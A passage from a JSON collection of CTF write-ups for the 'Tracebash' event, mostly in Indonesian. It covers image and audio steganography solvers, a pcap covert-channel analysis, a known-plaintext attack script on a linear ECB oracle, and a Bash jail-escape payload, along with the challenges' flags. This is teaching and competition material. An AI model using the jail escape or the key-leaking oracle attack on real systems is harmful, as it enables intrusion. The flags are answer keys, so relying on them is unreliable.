yield \"BT.601 float\", y_float\r\n\r\n\r\ndef calculate_dct(y: np.ndarray) -> np.ndarray:\r\n    block = 8\r\n    rows = y.shape[0] // block\r\n    cols = y.shape[1] // block\r\n    cropped = y[: rows * block, : cols * block]\r\n    blocks = cropped.reshape(rows, block, cols, block).transpose(0, 2, 1, 3)\r\n    return dctn(blocks - 128.0, axes=(-2, -1), norm=\"ortho\")\r\n\r\n\r\ndef coefficient_bitplanes(coefficients: np.ndarray, deep: bool) -> Iterator[tuple[str, np.ndarray]]:\r\n    # \"coeff3x3\" can mean array index [3,3] or the third coefficient [2,2].\r\n    for u, v in ((3, 3), (2, 2)):\r\n        c = coefficients[:, :, u, v]\r\n        yield f\"coeff({u},{v}) sign\", c >= 0\r\n        yield f\"coeff({u},{v}) rounded parity\", np.rint(c).astype(np.int64) & 1\r\n        yield f\"coeff({u},{v}) absolute rounded parity\", np.rint(np.abs(c)).astype(np.int64) & 1\r\n        yield f\"coeff({u},{v}) absolute floor parity\", np.floor(np.abs(c)).astype(np.int64) & 1\r\n\r\n        steps = (2, 4, 8, 10, 16) if not deep else range(1, 33)\r\n        for step in steps:\r\n            bits = np.rint(np.abs(c) / float(step)).astype(np.int64) & 1\r\n            yield f\"coeff({u},{v}) QIM step={step}\", bits\r\n\r\n        if deep:\r\n            for du, dv in ((0, 1), (1, 0), (0, -1), (-1, 0), (1, 1), (-1, -1)):\r\n                uu, vv = u + du, v + dv\r\n                if not (0 <= uu < 8 and 0 <= vv < 8):\r\n                    continue\r\n                other = coefficients[:, :, uu, vv]\r\n                yield f\"abs({u},{v}) > abs({uu},{vv})\", np.abs(c) > np.abs(other)\r\n                yield f\"({u},{v}) > ({uu},{vv})\", c > other\r\n\r\n\r\ndef flatten_plane(plane: np.ndarray, order: str) -> np.ndarray:\r\n    matrix = np.asarray(plane, dtype=np.uint8)\r\n    if order == \"row\":\r\n        return matrix.ravel()\r\n    if order == \"column\":\r\n        return matrix.T.ravel()\r\n    if order == \"snake\":\r\n        copy = matrix.copy()\r\n        copy[1::2] = copy[1::2, ::-1]\r\n        return copy.ravel()\r\n    if order == \"row-reverse\":\r\n        return matrix.ravel()[::-1]\r\n    if order == \"column-reverse\":\r\n        return matrix.T.ravel()[::-1]\r\n    if order == \"column-snake\":\r\n        copy = matrix.T.copy()\r\n        copy[1::2] = copy[1::2, ::-1]\r\n        return copy.ravel()\r\n    raise ValueError(order)\r\n\r\n\r\ndef password_permutations(length: int, password: bytes) -> Iterator[tuple[str, np.ndarray | None]]:\r\n    yield \"natural\", None\r\n    if not password:\r\n        return\r\n\r\n    digest = hashlib.sha256(password).digest()\r\n    seeds = {\r\n        \"sha256-be\": int.from_bytes(digest[:4], \"big\"),\r\n        \"sha256-le\": int.from_bytes(digest[:4], \"little\"),\r\n        \"md5-be\": int.from_bytes(hashlib.md5(password).digest()[:4], \"big\"),\r\n        \"crc32\": zlib.crc32(password),\r\n        \"byte-sum\": sum(password),\r\n    }\r\n\r\n    for name, seed in seeds.items():\r\n        yield f\"numpy-default_rng-{name}\", np.random.default_rng(seed).permutation(length)\r\n        yield f\"numpy-RandomState-{name}\", np.random.RandomState(seed).permutation(length)\r\n\r\n    indexes = list(range(length))\r\n    random.Random(password.decode(errors=\"ignore\")).shuffle(indexes)\r\n    yield \"python-random-string\", np.asarray(indexes, dtype=np.int64)\r\n\r\n\r\ndef pack_bits(bits: np.ndarray, bit_offset: int, bit_order: str, invert: bool) -> bytes:\r\n    data = np.asarray(bits, dtype=np.uint8)\r\n    if invert:\r\n        data = data ^ 1\r\n    data = data[bit_offset:]\r\n    data = data[: (len(data) // 8) * 8]\r\n    if not len(data):\r\n        return b\"\"\r\n    return np.packbits(data, bitorder=bit_order).tobytes()\r\n\r\n\r\ndef xor_repeat(data: bytes, key: bytes) -> bytes:\r\n    if not key:\r\n        return data\r\n    return bytes(value ^ key[i % len(key)] for i, value in enumerate(data))\r\n\r\n\r\ndef add_repeat(data: bytes, key: bytes, subtract: bool) -> bytes:\r\n    if not key:\r\n        return data\r\n    if subtract:\r\n        return bytes((value - key[i % len(key)]) & 0xFF for i, value in enumerate(data))\r\n    return bytes((value + key[i % len(key)]) & 0xFF for i, value in enumerate(data))\r\n\r\n\r\ndef rc4(data: bytes, key: bytes) -> bytes:\r\n    if not key:\r\n        return data\r\n    state = list(range(256))\r\n    j = 0\r\n    for i in range(256):\r\n        j = (j + state[i] + key[i % len(key)]) & 0xFF\r\n        state[i], state[j] = state[j], state[i]\r\n\r\n    out = bytearray()\r\n    i = j = 0\r\n    for value in data:\r\n        i = (i + 1) & 0xFF\r\n        j = (j + state[i]) & 0xFF\r\n        state[i], state[j] = state[j], state[i]\r\n        out.append(value ^ state[(state[i] + state[j]) & 0xFF])\r\n    return bytes(out)\r\n\r\n\r\ndef direct_decodings(blob: bytes, password: bytes) -> Iterator[tuple[str, bytes]]:\r\n    yield \"raw\", blob\r\n    if not password:\r\n        return\r\n\r\n    yield \"xor(password)\", xor_repeat(blob, password)\r\n    yield \"subtract(password)\", add_repeat(blob, password, subtract=True)\r\n    yield \"add(password)\", add_repeat(blob, password, subtract=False)\r\n    yield \"RC4(password)\", rc4(blob, password)\r\n\r\n    for name, key in (\r\n        (\"MD5\", hashlib.md5(password).digest()),\r\n        (\"SHA1\", hashlib.sha1(password).digest()),\r\n        (\"SHA256\", hashlib.sha256(password).digest()),\r\n    ):\r\n        yield f\"xor({name}(password))\", xor_repeat(blob, key)\r\n\r\n\r\ndef wrapped_decodings(label: str, blob: bytes, password: bytes) -> Iterator[tuple[str, bytes]]:\r\n    yield label, blob\r\n\r\n    # Common fixed-length header formats.\r\n    if len(blob) >= 4:\r\n        for name, fmt in ((\"uint32-be\", \">I\"), (\"uint32-le\", \"<I\")):\r\n            size = struct.unpack(fmt, blob[:4])[0]\r\n            if 0 < size <= len(blob) - 4:\r\n                yield f\"{label} -> {name}\", blob[4 : 4 + size]\r\n\r\n    stripped = blob.strip(b\"\\x00\\r\\n\\t \")\r\n    if stripped and stripped != blob:\r\n        yield f\"{label} -> strip\", stripped\r\n\r\n    # Decode text wrappers only when the entire stripped stream fits the alphabet.\r\n    if len(stripped) >= 8 and re.fullmatch(rb\"[A-Za-z0-9+/=_-]+\", stripped):\r\n        try:\r\n            yield f\"{label} -> base64\", base64.b64decode(stripped, validate=False)\r\n        except Exception:\r\n            pass\r\n    if len(stripped) >= 8 and len(stripped) % 2 == 0 and re.fullmatch(rb\"[0-9A-Fa-f]+\", stripped):\r\n        try:\r\n            yield f\"{label} -> hex\", bytes.fromhex(stripped.decode())\r\n        except Exception:\r\n            pass\r\n\r\n    # Compression is attempted only when a matching header is present.\r\n    decompressors = (\r\n        (b\"\\x1f\\x8b\", \"gzip\", gzip.decompress),\r\n        (b\"BZh\", \"bz2\", bz2.decompress),\r\n        (b\"\\xfd7zXZ\\x00\", \"lzma\", lzma.decompress),\r\n        (b\"x\\x01\", \"zlib\", zlib.decompress),\r\n        (b\"x\\x9c\", \"zlib\", zlib.decompress),\r\n        (b\"x\\xda\", \"zlib\", zlib.decompress),\r\n    )\r\n    for magic, name, function in decompressors:\r\n        start = blob.find(magic)\r\n        if start < 0:\r\n            continue\r\n        try:\r\n            yield f\"{label} -> {name}\", function(blob[start:])\r\n        except Exception:\r\n            pass\r\n\r\n    # Python supports traditional ZipCrypto when a password is supplied.\r\n    for match in list(re.finditer(re.escape(b\"PK\\x03\\x04\"), blob[:65536]))[:4]:\r\n        try:\r\n            with zipfile.ZipFile(io.BytesIO(blob[match.start() :])) as archive:\r\n                for info in archive.infolist():\r\n                    if info.is_dir():\r\n                        continue\r\n                    try:\r\n                        member = archive.read(info, pwd=password or None)\r\n                    except Exception:\r\n                        continue\r\n                    yield f\"{label} -> zip:{info.filename}\", member\r\n        except Exception:\r\n            pass\r\n\r\n\r\ndef inspect_blob(blob: bytes, password: bytes) -> Hit | None:\r\n    seen: set[bytes] = set()\r\n    queue: list[tuple[str, bytes, int]] = [\r\n        (label, data, 0) for label, data in direct_decodings(blob, password)\r\n    ]\r\n\r\n    while queue:\r\n        label, data, depth = queue.pop(0)\r\n        digest = hashlib.sha256(data).digest()\r\n        if digest in seen:\r\n            continue\r\n        seen.add(digest)\r\n\r\n        match = FLAG_RE.search(data)\r\n        if match:\r\n            return Hit(match.group(0), label)\r\n\r\n        if depth >= 2:\r\n            continue\r\n        for next_label, decoded in wrapped_decodings(label, data, password):\r\n            if decoded != data:\r\n                queue.append((next_label, decoded, depth + 1))\r\n\r\n    return None\r\n\r\n\r\ndef candidate_streams(\r\n    plane: np.ndarray,\r\n    password: bytes,\r\n    stage: str,\r\n) -> Iterator[tuple[str, bytes]]:\r\n    if stage == \"hinted\":\r\n        orders = (\"row\",)\r\n        use_permutations = False\r\n        offsets = (0,)\r\n    elif stage == \"password\":\r\n        orders = (\"row\", \"snake\", \"column\")\r\n        use_permutations = True\r\n        offsets = (0,)\r\n    else:\r\n        orders = (\"row\", \"snake\", \"column\", \"row-reverse\", \"column-reverse\", \"column-snake\")\r\n        use_permutations = True\r\n        offsets = range(8)\r\n\r\n    for order in orders:\r\n        flat = flatten_plane(plane, order)\r\n        permutations: Iterable[tuple[str, np.ndarray | None]]\r\n        if use_permutations:\r\n            permutations = password_permutations(len(flat), password)\r\n        else:\r\n            permutations = ((\"natural\", None),)\r\n\r\n        for permutation_name, permutation in permutations:\r\n            selected = flat if permutation is None else flat[permutation]\r\n            for invert in (False, True):\r\n                for offset in offsets:\r\n                    for bit_order in (\"big\", \"little\"):\r\n                        packed = pack_bits(selected, offset, bit_order, invert)\r\n                        label = (\r\n                            f\"order={order}; permutation={permutation_name}; invert={invert}; \"\r\n                            f\"bit-offset={offset}; bit-order={bit_order}\"\r\n                        )\r\n                        yield label, packed\r\n\r\n\r\ndef solve(path: Path, password: bytes, deep: bool, verbose: bool) -> Hit | None:\r\n    stages = [\"hinted\", \"password\"]\r\n    if deep:\r\n        stages.append(\"deep\")\r\n\r\n    for y_name, y in luminance_variants(path):\r\n        coefficients = calculate_dct(y)\r\n        if verbose:\r\n            rows, cols = coefficients.shape[:2]\r\n            print(f\"[*] {y_name}: {cols} x {rows} DCT blocks\", file=sys.stderr)\r\n\r\n        planes = list(coefficient_bitplanes(coefficients, deep=deep))\r\n        for stage in stages:\r\n            if verbose:\r\n                print(f\"[*] Stage: {stage}\", file=sys.stderr)\r\n            for plane_name, plane in planes:\r\n                for stream_name, blob in candidate_streams(plane, password, stage):\r\n                    hit = inspect_blob(blob, password)\r\n                    if hit:\r\n                        return Hit(\r\n                            hit.flag,\r\n                            f\"{y_name}; {plane_name}; {stream_name}; decode={hit.path}\",\r\n                        )\r\n    return None\r\n\r\n\r\ndef parse_args() -> argparse.Namespace:\r\n    parser = argparse.ArgumentParser(description=\"Extract the Frequency Trap flag\")\r\n    parser.add_argument(\"image\", nargs=\"?\", default=\"frequency_trap.png\", type=Path)\r\n    parser.add_argument(\"--password\", help=\"override the password stored as Brainfuck in LensModel\")\r\n    parser.add_argument(\"--deep\", action=\"store_true\", help=\"try slower compatibility variants\")\r\n    parser.add_argument(\"--verbose\", action=\"store_true\")\r\n    return parser.parse_args()\r\n\r\n\r\ndef main() -> int:\r\n    args = parse_args()\r\n    if not args.image.is_file():\r\n        print(f\"[-] File not found: {args.image}\", file=sys.stderr)\r\n        return 1\r\n\r\n    metadata = read_metadata(args.image)\r\n    if args.verbose:\r\n        print(f\"[*] ImageDescription: {metadata.method or '<missing>'}\", file=sys.stderr)\r\n        print(f\"[*] LensModel: {metadata.lens_model or '<missing>'}\", file=sys.stderr)\r\n\r\n    if args.password is not None:\r\n        password = args.password.encode()\r\n    elif metadata.lens_model and any(ch in BF_OPS for ch in metadata.lens_model):\r\n        password = brainfuck(metadata.lens_model)\r\n    else:\r\n        print(\"[-] Brainfuck password was not found in LensModel. Use --password.\", file=sys.stderr)\r\n        return 1\r\n\r\n    if args.verbose:\r\n        print(f\"[*] Password: {password.decode(errors='replace')}\", file=sys.stderr)\r\n\r\n    hit = solve(args.image, password, args.deep, args.verbose)\r\n    if not hit:\r\n        print(\"[-] Flag was not recovered.\", file=sys.stderr)\r\n        print(\"[-] Make sure the input is the original 2500x1996 PNG, not a resized preview.\", file=sys.stderr)\r\n        print(\"[-] Retry with --deep for additional coefficient and traversal variants.\", file=sys.stderr)\r\n        return 2\r\n\r\n    if args.verbose:\r\n        print(f\"[+] Extraction path: {hit.path}\", file=sys.stderr)\r\n    print(f\"<FLAG>{hit.flag.decode(errors='replace')}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{frequency_trap_successful}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-foren-phaseshift",
    "title": "Phase Shift — Forensics",
    "ctfName": "Tracebash",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Phase Shift — Forensics",
    "problemDescription": "Audio FLAC ini menyimpan dua lapis informasi:\n\n1. Melodi delapan detik membentuk progresi akor `Am-C-F-G`.\n2. Tanda fase bin FFT pada 16.384 sampel pertama menyimpan header panjang dan blob terenkripsi.\n\nString progresi akor di-hash dengan SHA-256 dan dipakai sebagai kunci AES-256-CBC. Enam belas byte pertama blob adalah IV, sisanya ciphertext.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Hasil penting:\n\n\n\nKomentar Vorbis memberi arah analisis:\n\n\n\nPetunjuk tersebut mengarah ke tiga hal:\n\n- identifikasi nada atau akor,\n- gabungkan hasil memakai tanda hubung,\n- hash menggunakan SHA-256,\n- periksa fase pada blok 16K sampel.",
        "code": "file challenge.flac\nffprobe -v error -show_format -show_streams challenge.flac\nmetaflac --list challenge.flac\nstrings -a -n 6 challenge.flac | head"
      },
      {
        "title": "Identifikasi progresi akor",
        "content": "Audio dibagi menjadi empat segmen, masing-masing berdurasi dua detik. FFT pada tiap segmen menunjukkan pitch class dominan berikut:\n\n| Segmen | Nada dominan | Akor |\n|---|---|---|\n| 0–2 detik | A, C, E | A minor (`Am`) |\n| 2–4 detik | C, E, G | C major (`C`) |\n| 4–6 detik | F, A, C | F major (`F`) |\n| 6–8 detik | G, B, D | G major (`G`) |\n\nProgresinya adalah:\n\n\n\nMaterial kuncinya mengikuti komentar metadata:\n\n\n\nHash yang dihasilkan:",
        "code": "Am-C-F-G"
      },
      {
        "title": "Ekstraksi phase coding",
        "content": "Ambil tepat 16.384 sampel pertama dan jalankan FFT tanpa window:\n\n\n\nBin DC dilewati. Fase bin berikutnya berada di sekitar `+π/2` atau `-π/2`, sehingga tandanya dapat dipetakan menjadi bit:\n\n\n\nPemetaan yang dipakai:\n\n\n\nEmpat byte pertama dibaca sebagai integer big-endian:\n\n\n\nSetelah header 32 bit, 512 bit berikutnya membentuk blob 64 byte:",
        "code": "spectrum = np.fft.fft(samples[:16384])\nphases = np.angle(spectrum)"
      },
      {
        "title": "Dekripsi",
        "content": "Struktur blob:\n\n\n\nDekripsi dilakukan dengan AES-256-CBC memakai hasil SHA-256 progresi akor. Plaintext memakai PKCS#7 padding.\n\n\n\nSetelah dekripsi dan unpadding:",
        "code": "16 byte IV || 48 byte AES-CBC ciphertext"
      },
      {
        "title": "Menjalankan solver",
        "content": "Output:",
        "code": "python3 solve.py challenge.flac"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import numpy as np, soundfile as sf, hashlib\r\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\r\nfrom cryptography.hazmat.primitives.padding import PKCS7\r\nx,sr=sf.read('challenge.flac')\r\nif x.ndim>1: x=x.mean(axis=1)\r\n\r\nnames=['C','C#','D','D#','E','F','F#','G','G#','A','A#','B']\r\nchords=[]\r\nfor idx,seg in enumerate(np.array_split(x,4)):\r\n    n=len(seg)\r\n    X=np.abs(np.fft.rfft(seg*np.hanning(n)))\r\n    freqs=np.fft.rfftfreq(n,1/sr)\r\n    energy=np.zeros(12)\r\n    for midi in range(36,85):\r\n        f=440*2**((midi-69)/12)\r\n        k=np.argmin(abs(freqs-f))\r\n        lo=max(0,k-1); hi=min(len(X),k+2)\r\n        energy[midi%12]+=np.max(X[lo:hi])**2\r\n    best=None\r\n    for root in range(12):\r\n        for quality,ints,suffix in [('maj',(0,4,7),''),('min',(0,3,7),'m')]:\r\n            triad=sum(energy[(root+i)%12] for i in ints)\r\n            outside=(energy.sum()-triad)\r\n            score=triad-0.08*outside\r\n            cand=(score,names[root]+suffix)\r\n            if best is None or cand[0]>best[0]: best=cand\r\n    chords.append(best[1])\r\n    print(idx, best, sorted([(energy[i],names[i]) for i in range(12)], reverse=True)[:5])\r\nprint('progression', chords)\r\n\r\nN=16384\r\nphase=np.angle(np.fft.fft(x[:N]))\r\nbits=(phase[1:]<0).astype(np.uint8)\r\ndef to_bytes(b):\r\n    return bytes(np.packbits(b,bitorder='big'))\r\nbitlen=int.from_bytes(to_bytes(bits[:32]),'big')\r\npayload=to_bytes(bits[32:32+bitlen])\r\nprint('bitlen',bitlen,'payload',len(payload),payload.hex())\r\nkey_material='-'.join(chords)\r\nkey=hashlib.sha256(key_material.encode()).digest()\r\niv,ct=payload[:16],payload[16:]\r\nd=Cipher(algorithms.AES(key),modes.CBC(iv)).decryptor()\r\npadded=d.update(ct)+d.finalize()\r\nunpad=PKCS7(128).unpadder(); pt=unpad.update(padded)+unpad.finalize()\r\nprint(key_material, key.hex(), pt)"
      }
    ],
    "terminalOutputs": [],
    "flag": "TBCTF{Ph4s3_M0dul4t10n_1s_Tr1cky_!992}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-foren-thesilentecho",
    "title": "The Silent Echo",
    "ctfName": "Tracebash",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Artefak cuma `challenge.pcap`, jadi jalurnya langsung ke triage traffic.",
    "problemDescription": "Artefak cuma `challenge.pcap`, jadi jalurnya langsung ke triage traffic.\n\nRecon cepat:\n\n```bash\nrtk file challenge.pcap\nrtk tshark -r challenge.pcap -q -z io,phs\nrtk tshark -r challenge.pcap -Y \"http\" -T fields -e frame.number -e ip.src -e ip.dst -e http.request.uri -e http.user_agent\nrtk tshark -r challenge.pcap -Y \"icmp\" -T fields -e frame.number -e ip.src -e ip.dst -e data.data\n```\n\nHasil penting:\n\n- Ada HTTP ke `10.0.0.80` dengan header aneh `X-Window-Trace: enabled`\n- Ada download palsu `/downloads/ubuntu-22.04.iso` dari `10.0.0.88`\n- Ada traffic ICMP bolak-balik dengan payload statis `A...A`\n- Ada stream SSH singkat yang cuma berisi base64 red herring: `Nothing here, keep looking.`",
    "tools": [],
    "analysis": "HTTP body dari `ubuntu-22.04.iso` ternyata bukan ISO, cuma 18 blok `0x00`. Jadi datanya tidak ada di payload.\n\nPetunjuk `X-Window-Trace: enabled` mengarah ke field `TCP Window` dari ACK klien pada stream download:\n\n```bash\nrtk tshark -r challenge.pcap -Y \"tcp.stream==2 && ip.src==192.168.1.122 && tcp.len==0\" \\\n  -T fields -e frame.number -e tcp.window_size_value\n```\n\nOffset tiap window terhadap `8192` membentuk ASCII:\n\n```text\nw1nd0w_4nd_1p_1d!}\n```\n\nBagian awal flag belum ada, jadi cek traffic ICMP. `ip.id` request ICMP terlihat tidak acak:\n\n```bash\nrtk tshark -r challenge.pcap -Y \"icmp.type==8\" \\\n  -T fields -e frame.number -e ip.id -e icmp.seq_le\n```\n\nKalau diambil byte tinggi dari tiap `ip.id`, hasilnya:\n\n```text\nTBCTF{h1dd3n_1n_\n```\n\nGabungkan kedua bagian:\n\n```text\nTBCTF{h1dd3n_1n_w1nd0w_4nd_1p_1d!}\n```",
    "solution": [],
    "terminalOutputs": [],
    "flag": "TBCTF{h1dd3n_1n_w1nd0w_4nd_1p_1d!}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-misc-aiapprove",
    "title": "AI Approved Garbled",
    "ctfName": "Tracebash",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "CTF Writeup: AI Approved Garbled (Misc / Crypto)",
    "problemDescription": "CTF Writeup: AI Approve Garbled (Misc / Crypto)\n\nDeskripsi Challenge\n\nDeskripsi: They asked a machine to build an impenetrable vault. It responded with an ocean of noise and a single mathematical trap. The oracle is waiting, but your questions are limited.\n\nKoneksi: nc 13.127.119.28 1339\n\nLimitasi: Maksimal 256 queries.\n\nRingkasan\n\nChallenge ini memberikan sebuah binary berjenis ELF 64-bit yang mengimplementasikan \"AI Security Enhancement Pipeline\". Sistem membatasi kita hanya pada 256 queries. Berkat adanya file Dockerfile.participant, kita menyadari bahwa binary ini dapat dijalankan secara lokal dalam mode --interactive.\n\nKerentanan utama terletak pada penggunaan enkripsi yang sepenuhnya Linear (Affine Transformation) dalam mode ECB (Electronic Codebook). Tidak adanya lapisan non-linear (seperti S-Box pada AES yang menggunakan inversi finite field) membuat kunci enkripsi dan pola permutasi blok dapat diekstraksi hanya dengan Known-Plaintext Attack (KPA) sederhana.\n\nAnalisis Teori dan Metodologi\n\n1. Deteksi Mode Operasi (ECB)\n\nPengujian pertama dilakukan dengan mengirimkan input panjang berupa karakter berulang (41 atau huruf 'A' sebanyak 32 byte). Output ciphertext yang dihasilkan adalah:\n0a83371f212d94d0d0476945c33d8067 0a83371f212d94d0d0476945c33d8067 ...\n\nTerlihat bahwa blok 16-byte pertama dan kedua memiliki hasil yang sama persis. Secara teoretis, ini membuktikan bahwa enkripsi menggunakan mode Electronic Codebook (ECB), di mana setiap blok $P_i$ dienkripsi secara independen menjadi $C_i$.\n\n2. Sifat Linear dan \"The Mathematical Trap\"\n\nSistem kriptografi modern yang aman membutuhkan komponen Non-Linear (S-Box) berdasarkan Prinsip Shannon tentang Confusion dan Diffusion.\nJika sebuah fungsi enkripsi $E(x)$ bersifat linear, maka ia dapat direpresentasikan sebagai operasi matriks (Affine Cipher):\n$$ E(x) = A \\cdot x \\oplus K $$\ndimana $A$ adalah matriks permutasi/transformasi dan $K$ adalah Key.\n\nDalam fungsi linear $XOR$, elemen identitas adalah $0$. Jika kita memberikan input plaintext bernilai $0$, fungsi tersebut akan menghasilkan kuncinya sendiri:\n$$ E(0) = A \\cdot 0 \\oplus K = K $$\nDengan mengirimkan 16-byte 00, kita berhasil memaksa oracle untuk memuntahkan kunci enkripsi ($K$) secara mentah!\n\n3. Membongkar Permutasi (Affine S-Box)\n\nSetelah kunci ($K$) didapatkan, dekripsi awal menghasilkan teks yang diacak: 4F1A_G{f3nsbf0Lx2_bn__1_t11s8_1slt3l}l_nr411.\nIni menandakan matriks $A$ dari fungsi di atas merupakan sebuah fungsi permutasi transposisi byte.\n\nUntuk memetakannya, kita kembali menggunakan Known-Plaintext Attack. Kita mengirimkan urutan byte berurutan: 000102030405060708090a0b0c0d0e0f. Setelah di-XOR kembali dengan kunci $K$, hasil ciphertext akan menunjukkan posisi ke mana setiap byte berpindah.\n\nLangkah Eksekusi (Walkthrough)\n\nLangkah 1: Mencuri Kunci dari Server\n\nAlih-alih membakar 256 queries untuk melakukan brute-force, kita memanfaatkan sesi koneksi pertama untuk menangkap Encrypted Flag, lalu mengirim payload 00 (sebanyak 32 karakter hex) untuk mengekstrak kunci.\n\nEncrypted Flag Server: `7f84471f...`\n\nPayload dikirim: `00000000000000000000000000000000`\n\nKey yang bocor: `4bc2765e606cd59191062804827cc126`\n\nLangkah 2: Menguraikan Pola Permutasi (Lokal)\n\nKarena permutasi bersifat statis, kita bisa melakukan analisis ini di mesin lokal tanpa koneksi internet. Kita menjalankan program lokal dan memasukkan urutan heksadesimal 00 hingga 0f. Output ini digunakan untuk membuat mapping indeks permutasi.\n\nLangkah 3: Final Decryption Script\n\nBerikut adalah script akhir yang digunakan untuk mengotomasikan dekripsi (XOR) dan transposisi (Unscramble):\n\n```python\nimport subprocess\n\np = subprocess.Popen(['./ai-approved-garbled', '--interactive'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)\npayload = \"\".join([f\"{i:02x}\" for i in range(16)])\nout, _ = p.communicate((payload + '\\n').encode())\n\nct_hex = \"\"\nfor line in out.decode('utf-8', errors='ignore').split('\\n'):\n    if 'Ciphertext:' in line:\n        ct_hex = line.split('Ciphertext:')[1].strip()[:32]\n        break\n\nkey_hex = \"4bc2765e606cd59191062804827cc126\"\nkey_b = bytes.fromhex(key_hex)\nct_b = bytes.fromhex(ct_hex)\n\nperm = [ct_b[i] ^ key_b[i] for i in range(16)]\n\nenc_flag_hex = \"7f84471f3f2baef7a2685b66e44c8d5e799d14303f33e4cee5371977ba23f05527b645321d008affe3322c00b378f022\"\nenc_b = bytes.fromhex(enc_flag_hex)\n\nxored = [enc_b[i] ^ key_b[i % 16] for i in range(len(enc_b))]\n\nflag = [''] * len(enc_b)\nfor block in range(len(enc_b) // 16):\n    for i in range(16):\n        orig_pos = perm[i]\n        flag[block * 16 + orig_pos] = chr(xored[block * 16 + i])\n\nprint(f\"FLAG: {''.join(flag)}\")\n```\n\nHasil Akhir\n\nMengeksekusi langkah-langkah di atas berhasil merestorasi flag dengan sempurna:\n`FLAG{4ff1n3_sb0x_1n_128_b1t_1s_st1ll_l1n34r}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import socket\r\nimport re\r\n\r\nhost = \"13.127.119.28\"\r\nport = 1339\r\n\r\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\r\n    s.connect((host, port))\r\n    \r\n    # 1. Ambil banner awal dan ekstrak Encrypted Flag\r\n    resp1 = s.recv(4096).decode('utf-8', errors='ignore')\r\n    enc_flag_match = re.search(r'Encrypted flag:\\s*([0-9a-f]+)', resp1)\r\n    if not enc_flag_match:\r\n        print(\"[-] Gagal mendapatkan Encrypted Flag. Coba lagi.\")\r\n        exit(1)\r\n        \r\n    enc_flag = enc_flag_match.group(1)\r\n    print(f\"[*] Remote Encrypted Flag : {enc_flag}\")\r\n    \r\n    # 2. Kirim 16 byte '00' (32 karakter hex) untuk memancing Key keluar\r\n    print(\"[*] Mengirim 32 nol untuk mencuri XOR key...\")\r\n    s.send(b\"00000000000000000000000000000000\\n\")\r\n    \r\n    # 3. Tangkap Key dari response ciphertext server\r\n    resp2 = s.recv(4096).decode('utf-8', errors='ignore')\r\n    key_match = re.search(r'Ciphertext:\\s*([0-9a-f]+)', resp2)\r\n    if not key_match:\r\n        print(\"[-] Gagal mendapatkan Key.\")\r\n        exit(1)\r\n        \r\n    key = key_match.group(1)[:32] # Ambil 16 byte (32 hex) pertama\r\n    print(f\"[*] Remote XOR Key        : {key}\")\r\n    \r\n    # 4. Dekripsi Encrypted Flag dengan XOR Key\r\n    flag_bytes = bytes.fromhex(enc_flag)\r\n    key_bytes = bytes.fromhex(key)\r\n    \r\n    flag = \"\".join(chr(flag_bytes[i] ^ key_bytes[i % 16]) for i in range(len(flag_bytes)))\r\n    print(f\"\\n[+] Misi Selesai. FLAG: {flag}\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "FLAG{4ff1n3_sb0x_1n_128_b1t_1s_st1ll_l1n34r}",
    "lessonsLearned": []
  },
  {
    "id": "tracebash-misc-nashjail",
    "title": "Nash Jail",
    "ctfName": "Tracebash",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-29",
    "author": "Nattt",
    "tags": [],
    "description": "Filter-nya kelihatan galak, tapi `eval \"$input\"` masih jadi titik masuk utama.",
    "problemDescription": "Filter-nya kelihatan galak, tapi `eval \"$input\"` masih jadi titik masuk utama. Huruf, angka, `/`, `.`, `*`, `!`, `%`, tanda kutip, `<`, `>`, `@`, dan `&` diblok. Yang masih boleh dipakai cukup buat main di ekspansi Bash.\n\nBug yang paling penting ada di awal script:\n\n```bash\nexport PATH=\"\"\nunset $(env | cut -d= -f1)\n```\n\n`PATH` dikosongkan duluan, jadi `env` dan `cut` gagal jalan. Environment tidak benar-benar dibersihkan.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Inti exploit",
        "content": "Payload final:\n\n\n\nUrutannya:\n\n1. `: ???????`\n   Menjalankan builtin `:` dengan glob 7 karakter. Argumen terakhir yang masuk ke shell jadi `jail.sh`, lalu bisa diambil lewat `$_`.\n\n2. `__=$_`\n   Simpan `jail.sh` ke variabel `__`.\n\n3. `__=${__#????}`\n   Buang `jail`, hasilnya `.sh`.\n\n4. `__=${__:$#:${##}}`\n   `$#` bernilai `0`, `${##}` bernilai `1`. Jadi ini mengambil 1 karakter mulai offset 0 dari `.sh`, hasilnya `.`.\n\n5. `${__} ????????`\n   `${__}` sekarang adalah builtin `.` (`source`), dan `????????` di direktori kerja match ke `flag.txt`.\n\nKarena glob di-expand urut alfabet, `????????` memilih `flag.txt` sebelum `jail.sh` dan `start.sh`. File flag lalu di-`source`, sehingga isi baris flag muncul di error:\n\n\n\nItu cukup buat ambil flag.",
        "code": ": ???????;__=$_;__=${__#????};__=${__:$#:${##}};${__} ????????"
      },
      {
        "title": "Reproduksi",
        "content": "Jalankan solver:\n\n\n\nOutput penting:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
